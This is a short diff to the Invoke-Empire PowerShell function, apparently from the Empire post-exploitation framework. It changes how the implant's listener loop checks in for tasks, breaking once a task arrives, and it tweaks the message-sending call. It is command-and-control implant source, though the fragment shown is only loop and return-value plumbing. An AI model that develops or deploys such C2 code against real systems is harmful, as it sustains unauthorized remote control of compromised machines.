@@ -769,14 +769,16 @@ function Invoke-Empire {
 			if ($JobResults) {
 				((& $SendMessage -Listener $l -Packets $JobResults))
 			}
-			((& $script:GetTask -Listener $l))
+			if ((& $script:GetTask -Listener $l)){
+                break
+            }
 		}
 		((& $script:CleanUpListeners))
 	}
 	# send message function iterating through listeners
 	$script:SendMessage = {
 		param($Listener, $Packets)
-        (& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"])
+        ((& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"]))
 	}
 
 	$script:GetTask = {
@@ -785,11 +787,13 @@ function Invoke-Empire {
 		$TaskData = (& $Listener['get_task_func'] -FixedParameters $Listener["fixed_parameters"])
 		if (!$TaskData){
 			$Listener['missedCheckins'] += 1
+            $False
 		}
 		else {
 			if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $Listener['defaultResponse']) {
 				Decode-RoutingPacket -PacketData $TaskData
 			}
+            $True
 		}
 	}
 
